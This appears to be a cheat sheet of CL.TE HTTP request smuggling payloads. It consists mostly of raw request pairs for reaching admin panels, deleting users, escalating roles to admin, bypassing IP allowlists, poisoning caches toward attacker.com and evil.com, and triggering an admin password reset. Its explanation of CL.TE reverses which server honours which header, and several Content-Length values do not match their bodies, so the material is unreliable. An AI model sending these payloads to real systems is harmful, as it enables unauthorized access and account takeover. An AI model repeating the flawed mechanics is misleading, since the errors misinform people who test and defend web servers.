### üõ°Ô∏è CL.TE (Content-Length & Transfer-Encoding) HTTP Request Smuggling

**CL.TE (Content-Length & Transfer-Encoding)** is a type of HTTP request smuggling attack that exploits discrepancies in how frontend and backend servers handle HTTP headers. The frontend server processes the `Transfer-Encoding: chunked` header, while the backend server prioritizes the `Content-Length` header, allowing an attacker to smuggle additional requests. This technique requires **two requests**: the first smuggles the malicious request into the backend buffer, and the second triggers its execution.

  * **Two-Step Process:** First request smuggles, second request activates
  * **Header Discrepancy:** Frontend uses Transfer-Encoding, backend uses Content-Length
  * **Smuggling Mechanism:** Embed a second request in the body of the first, terminated by chunked encoding
  * **Common Exploits:** Accessing admin panels, deleting users, or bypassing authentication
  * **Impact:** Unauthorized access, data manipulation, security control bypass

-----

### üìù Basic CL.TE Payloads and Impact

Understanding the fundamental CL.TE attack vectors and their potential impact.

  * **Understanding CL.TE Two-Request Process**

    **Step 1: Smuggling Request**
    ```http
    POST / HTTP/1.1
    Host: vulnerable.com
    Content-Length: 13
    Transfer-Encoding: chunked

    0

    SMUGGLED
    ```

    **Step 2: Activation Request**
    ```http
    GET /anything HTTP/1.1
    Host: vulnerable.com
    ```

    **Why it's used:** To test for CL.TE vulnerabilities where frontend processes chunked encoding but backend uses Content-Length.
    
    **How it works:**
    * Frontend server sees `Transfer-Encoding: chunked` and processes the entire request
    * Backend server uses `Content-Length: 13` and reads only 13 bytes after headers
    * The smuggled content "SMUGGLED" remains in the backend's buffer
    * When the second request arrives, the backend prepends "SMUGGLED" to it
    * This allows attackers to prepend malicious content to legitimate requests

  * **Simple GET Request Smuggling with Activation**

    **Step 1: Smuggling the GET Request**
    ```http
    POST / HTTP/1.1
    Host: vulnerable.com
    Content-Length: 49
    Transfer-Encoding: chunked

    0

    GET /admin HTTP/1.1
    Host: localhost
    X-Ignore: x
    ```

    **Step 2: Activating the Smuggled Request**
    ```http
    GET /home HTTP/1.1
    Host: vulnerable.com
    ```

    **Why it's used:** For smuggling GET requests to internal endpoints like admin panels.
    
    **How it works:**
    * Frontend processes the chunked request completely
    * Backend reads only 49 bytes due to `Content-Length: 49`
    * The smuggled GET request to `/admin` remains in the buffer
    * When the second request arrives, backend sees: `GET /admin...` + `GET /home...`
    * Backend processes `GET /admin` as a complete request

  * **POST Request Smuggling with Body Activation**

    **Step 1: Smuggling POST Request**
    ```http
    POST / HTTP/1.1
    Host: vulnerable.com
    Content-Length: 62
    Transfer-Encoding: chunked

    0

    POST /admin/delete HTTP/1.1
    Host: localhost
    Content-Length: 10

    username=admin
    ```

    **Step 2: Activating Request**
    ```http
    GET /index HTTP/1.1
    Host: vulnerable.com
    ```

    **Why it's used:** When smuggling POST requests with body content for actions like user deletion.
    
    **How it works:**
    * The smuggled POST request includes its own `Content-Length` header
    * Frontend processes the entire chunked payload
    * Backend reads only 62 bytes, leaving the POST request in buffer
    * When activation request arrives, backend processes the smuggled POST request
    * The `GET /index` request gets appended as body or causes error

-----

### üñºÔ∏è Advanced CL.TE Techniques with Activation

Sophisticated techniques for complex exploitation scenarios with activation requests.

  * **Bypassing Security Controls with Alternative Headers**

    **Step 1: Smuggling Request**
    ```http
    POST / HTTP/1.1
    Host: vulnerable.com
    Content-Length: 85
    Transfer-Encoding: chunked

    0

    GET /admin HTTP/1.1
    X-Forwarded-Host: localhost
    Content-Type: application/x-www-form-urlencoded; boundary=x
    X-Ignore: x
    ```

    **Step 2: Activation Request**
    ```http
    POST /api/data HTTP/1.1
    Host: vulnerable.com
    Content-Type: application/json
    Content-Length: 20

    {"test":"value"}
    ```

    **Why it's used:** When Host header duplication is blocked or detected by security controls.
    
    **How it works:**
    * Uses `X-Forwarded-Host` instead of duplicate `Host` header
    * Adds additional headers to make request appear legitimate
    * `X-Ignore` header provides padding to meet Content-Length requirement
    * Activation request triggers the smuggled `/admin` access

  * **Using Different HTTP Methods for API Exploitation**

    **Step 1: Smuggling PUT Request**
    ```http
    POST / HTTP/1.1
    Host: vulnerable.com
    Content-Length: 55
    Transfer-Encoding: chunked

    0

    PUT /api/users/1 HTTP/1.1
    Host: localhost
    Content-Length: 20

    {"role":"admin"}
    ```

    **Step 2: Activation Request**
    ```http
    GET /profile HTTP/1.1
    Host: vulnerable.com
    ```

    **Why it's used:** For exploiting API endpoints that use PUT, PATCH, or DELETE methods.
    
    **How it works:**
    * Smuggles a PUT request to modify user roles or permissions
    * Includes JSON body with role elevation payload
    * Targets REST API endpoints that may not be protected against smuggling
    * Activation request triggers the privilege escalation

-----

### üîÑ Complex Smuggling Scenarios with Activation

Advanced scenarios for sophisticated attacks with multiple activations.

  * **Chaining Multiple Requests with Single Activation**

    **Step 1: Smuggling Multiple Requests**
    ```http
    POST / HTTP/1.1
    Host: vulnerable.com
    Content-Length: 120
    Transfer-Encoding: chunked

    0

    GET /admin HTTP/1.1
    Host: localhost
    X-Ignore: x

    POST /log HTTP/1.1
    Host: localhost
    Content-Length: 15

    action=smuggled
    ```

    **Step 2: Activation Request**
    ```http
    GET /public HTTP/1.1
    Host: vulnerable.com
    ```

    **Why it's used:** When multiple operations need to be executed in sequence.
    
    **How it works:**
    * First smuggled request accesses admin panel
    * Second smuggled request logs the action (or performs another operation)
    * Both requests remain in backend buffer after frontend processing
    * Single activation request triggers both smuggled requests sequentially

  * **Smuggling with Application-Specific Headers**

    **Step 1: Smuggling Internal Request**
    ```http
    POST / HTTP/1.1
    Host: vulnerable.com
    Content-Length: 90
    Transfer-Encoding: chunked

    0

    GET /internal/status HTTP/1.1
    Host: 127.0.0.1
    X-Original-URL: /admin
    X-Rewrite-URL: /api
    ```

    **Step 2: Activation Request**
    ```http
    POST /submit HTTP/1.1
    Host: vulnerable.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 10

    data=test
    ```

    **Why it's used:** When applications use custom headers for routing or internal processing.
    
    **How it works:**
    * Uses internal host address `127.0.0.1` to bypass network restrictions
    * Includes application-specific headers that might affect routing
    * Targets internal endpoints not accessible from external networks
    * Activation request triggers access to internal status endpoint

-----

### üéØ Real-World Exploitation Examples with Activation

Practical examples of CL.TE exploitation with activation requests.

  * **Bypassing Authentication with Activation**

    **Step 1: Smuggling Admin Access**
    ```http
    POST / HTTP/1.1
    Host: target.com
    Content-Length: 65
    Transfer-Encoding: chunked

    0

    GET /admin/dashboard HTTP/1.1
    Host: internal
    X-API-Key: secret123
    ```

    **Step 2: Activation Request**
    ```http
    GET /login HTTP/1.1
    Host: target.com
    ```

    **Impact:** Access protected admin resources without proper authentication.
    
    **How it works:**
    * Smuggles request with internal host header
    * Includes API key or authentication bypass in headers
    * Activation request triggers access to admin dashboard
    * Can reveal sensitive administrative interfaces

  * **Data Manipulation and Privilege Escalation**

    **Step 1: Smuggling Privilege Escalation**
    ```http
    POST / HTTP/1.1
    Host: target.com
    Content-Length: 95
    Transfer-Encoding: chunked

    0

    POST /api/users/update HTTP/1.1
    Host: localhost
    Content-Length: 25

    {"id":1,"role":"admin"}
    ```

    **Step 2: Activation Request**
    ```http
    GET /api/status HTTP/1.1
    Host: target.com
    ```

    **Impact:** Elevate user privileges or modify sensitive data without authorization.
    
    **How it works:**
    * Smuggles API request to user update endpoint
    * Changes user role to "admin" in JSON payload
    * Activation request triggers the privilege escalation
    * Backend processes this as legitimate API call

  * **Cache Poisoning Attacks with Activation**

    **Step 1: Smuggling Cache Poisoning Request**
    ```http
    POST / HTTP/1.1
    Host: target.com
    Content-Length: 110
    Transfer-Encoding: chunked

    0

    GET /index.html HTTP/1.1
    Host: cdn-target
    X-Forwarded-Host: attacker.com

    GET /redirect HTTP/1.1
    Location: http://attacker.com
    ```

    **Step 2: Activation Request**
    ```http
    GET /static/logo.png HTTP/1.1
    Host: target.com
    ```

    **Impact:** Poison CDN caches or redirect users to malicious sites.
    
    **How it works:**
    * Smuggles request with malicious `X-Forwarded-Host` header
    * Targets CDN or caching infrastructure
    * Second smuggled request creates redirect to attacker site
    * Activation request triggers cache poisoning

-----

### üîç Real-World Exploitation Scenarios with Activation

Practical examples of CL.TE exploitation in different contexts with activation requests.

  * **Bypassing IP Whitelisting**

    **Step 1: Smuggling Internal Access**
    ```http
    POST /api/data HTTP/1.1
    Host: external-api.com
    Content-Length: 70
    Transfer-Encoding: chunked

    0

    GET /internal/metrics HTTP/1.1
    Host: 127.0.0.1
    X-Forwarded-For: 10.0.0.1
    ```

    **Step 2: Activation Request**
    ```http
    GET /api/health HTTP/1.1
    Host: external-api.com
    ```

    **Scenario:** An API only allows internal IP addresses to access metrics endpoint.
    **Impact:** Access internal monitoring data from external networks.

  * **Session Hijacking via Cache Poisoning**

    **Step 1: Smuggling Cache Poison**
    ```http
    POST / HTTP/1.1
    Host: app.com
    Content-Length: 95
    Transfer-Encoding: chunked

    0

    GET /account HTTP/1.1
    Host: app.com
    X-Forwarded-Host: evil.com
    X-Forwarded-Proto: https
    ```

    **Step 2: Activation Request**
    ```http
    GET /resources/style.css HTTP/1.1
    Host: app.com
    ```

    **Scenario:** Application caches responses and reflects headers.
    **Impact:** Poison cache to serve malicious content or steal sessions.

  * **Credential Harvesting with Activation**

    **Step 1: Smuggling Password Reset**
    ```http
    POST /login HTTP/1.1
    Host: secure-app.com
    Content-Length: 85
    Transfer-Encoding: chunked

    0

    GET /forgot-password?email=admin@company.com HTTP/1.1
    Host: internal
    X-API-Version: 2.0
    ```

    **Step 2: Activation Request**
    ```http
    POST /login HTTP/1.1
    Host: secure-app.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 30

    username=test&password=test123
    ```

    **Scenario:** Password reset functionality sends email to provided address.
    **Impact:** Trigger password reset for admin account to gain access.

-----

**Made with love by VIsh0k**